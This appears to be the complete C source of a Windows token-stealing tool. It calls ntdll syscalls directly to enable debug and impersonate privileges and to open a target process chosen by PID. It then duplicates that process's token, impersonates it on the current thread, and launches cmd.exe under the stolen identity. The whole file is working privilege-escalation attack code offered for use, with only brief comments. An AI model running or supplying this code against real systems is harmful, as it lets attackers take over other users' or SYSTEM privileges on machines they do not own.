#include <wchar.h>
#include <Windows.h>

#pragma comment(lib, "ntdll.lib")

//LUID values from: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1a92af76-d45f-42c3-b67c-f1dc61bd6ee1
#define LUID_SE_ASSIGNPRIMARYTOKEN 3
#define LUID_SE_DEBUG 20
#define LUID_SE_IMPERSONATE 29

typedef enum _THREADINFOCLASS
{
	ThreadImpersonationToken = 5 //Rust docs say so
} THREADINFOCLASS;

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;


#define CHECK_STATUS(Msg, Status) if (ERROR_SUCCESS != (Status)) {wprintf(L"LINE %d: %s%lu\r\n", __LINE__, (Msg), (Status));}

#define InitializeObjectAttributes( p, n, a, r, s, t ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );           \
    (p)->RootDirectory = r;                              \
    (p)->Attributes = a;                                 \
    (p)->ObjectName = n;                                 \
    (p)->SecurityDescriptor = s;                         \
    (p)->SecurityQualityOfService = t;                   \
    }


NTSTATUS NtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
NTSTATUS NtAdjustPrivilegesToken(HANDLE TokenHandle, BOOLEAN DisableAllPrivileges, PTOKEN_PRIVILEGES NewState,
                                 ULONG BufferLength, PTOKEN_PRIVILEGES PreviousState, PULONG ReturnLength);
NTSTATUS NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
                       PCLIENT_ID ClientId);
NTSTATUS NtDuplicateToken(HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
                          BOOLEAN EffectiveOnly, TOKEN_TYPE TokenType, PHANDLE NewTokenHandle);
NTSTATUS NtSetInformationThread(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation,
                                ULONG ThreadInformationLength);
NTSTATUS NtClose(HANDLE Handle);

HANDLE currentProcessHandle = ((HANDLE)(LONG_PTR)-1);
HANDLE currentThreadHandle = ((HANDLE)(LONG_PTR)-2);


// child process. We dont care about syscalls purity here  as the token was neatly stolen before.
VOID ChildCmd(HANDLE duplicatedTokenHandle)
{
	const LPCWSTR cszCmdLine = L"\"C:\\Windows\\system32\\cmd.exe\"";
	PVOID lpCmdLine; //we need writable memory to make CreateProcessAsUserW working
	size_t dwCmdLineLen;
	PROCESS_INFORMATION pi = {0};
	STARTUPINFO si = {0};

	//mess required by CreateProcessAsUserW()
	dwCmdLineLen = wcslen(cszCmdLine) + 1;
	lpCmdLine = (WCHAR*)LocalAlloc(LPTR, dwCmdLineLen * sizeof(WCHAR));
	if (!lpCmdLine)
	{
		wprintf((L"ERROR: Not enough memory.\r\n"));
		_exit(ERROR_NOT_ENOUGH_MEMORY);
	}
	memcpy(lpCmdLine, cszCmdLine, dwCmdLineLen * sizeof(WCHAR));

	si.cb = sizeof(si);
	si.lpDesktop = L"Winsta0\\Default";
	si.wShowWindow = TRUE;

	//create process with the token 
	wprintf((L"CreateProcessAsUserW() ... "));
	CreateProcessAsUserW(duplicatedTokenHandle, NULL, lpCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	wprintf((L"returned %ld\r\n\r\n"), GetLastError());
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
}


int wmain(int argc, WCHAR** argv, WCHAR** envp)
{
	UNREFERENCED_PARAMETER(envp);
	if (2 != argc)
	{
		wprintf(L"Usage: TokenStealWithSyscalls PID");
		return -1;
	}

	HANDLE targetProcessHandle;
	__int64 dwPid;
	dwPid = _wtoi(argv[1]);
	if (!dwPid)
	{
		wprintf(L"PID should be a number.\r\n");
		return -2;
	}

	wprintf(L"Stealing token from process #%lld.\r\n", dwPid);

	HANDLE currentTokenHandle;
	NTSTATUS Status;

	Status = NtOpenProcessToken(currentProcessHandle, TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	CHECK_STATUS(L"NtOpenProcessToken() returned ", Status);


	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid.HighPart = 0;
	tp.Privileges[0].Luid.LowPart = LUID_SE_DEBUG;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	Status = NtAdjustPrivilegesToken(currentTokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);
	CHECK_STATUS(L"NtAdjustPrivilegesToken() #1 returned ", Status);

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid.HighPart = 0;
	tp.Privileges[0].Luid.LowPart = LUID_SE_IMPERSONATE;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	Status = NtAdjustPrivilegesToken(currentTokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);
	CHECK_STATUS(L"NtAdjustPrivilegesToken() #2 returned ", Status);


	DWORD dwDesiredAccess;
	OBJECT_ATTRIBUTES Obja;
	CLIENT_ID ClientId;

	dwDesiredAccess = PROCESS_ALL_ACCESS;
	ClientId.UniqueThread = NULL;
	ClientId.UniqueProcess = (HANDLE)(dwPid);
	InitializeObjectAttributes(&Obja, NULL, 0, NULL, NULL, NULL);

	Status = NtOpenProcess(&targetProcessHandle, dwDesiredAccess, &Obja, &ClientId);
	CHECK_STATUS(L"NtOpenProcess() returned ", Status);


	HANDLE targetTokenHandle = NULL;

	Status = NtOpenProcessToken(
		targetProcessHandle,
		TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
		&targetTokenHandle);
	CHECK_STATUS(L"NtOpenProcessToken() returned ", Status);


	HANDLE duplicatedTokenHandle;
	OBJECT_ATTRIBUTES Obja2;
	SECURITY_QUALITY_OF_SERVICE SecurityQualityOfService;

	SecurityQualityOfService.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
	SecurityQualityOfService.ImpersonationLevel = SecurityImpersonation;
	SecurityQualityOfService.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
	SecurityQualityOfService.EffectiveOnly = FALSE;
	InitializeObjectAttributes(&Obja2, NULL, 0, NULL, NULL, &SecurityQualityOfService);

	Status = NtDuplicateToken(
		targetTokenHandle,
		MAXIMUM_ALLOWED,
		&Obja2,
		FALSE,
		TokenImpersonation,
		&duplicatedTokenHandle);
	CHECK_STATUS(L"NtDuplicateToken() returned ", Status);


	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid.HighPart = 0;
	tp.Privileges[0].Luid.LowPart = LUID_SE_ASSIGNPRIMARYTOKEN;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	Status = NtAdjustPrivilegesToken(duplicatedTokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);
	CHECK_STATUS(L"NtAdjustPrivilegesToken() #1 returned ", Status);


	Status = NtSetInformationThread(
		currentThreadHandle,
		ThreadImpersonationToken,
		(PVOID)&duplicatedTokenHandle,
		sizeof(duplicatedTokenHandle));
	CHECK_STATUS(L"NtSetInformationThread() returned ", Status);


	//here we are impersonated via syscalls. Launch cmd.exe to play with it. not caring about syscalls purity anymore.	
	ChildCmd(duplicatedTokenHandle);


	// NtClose(everything we have open above);
}
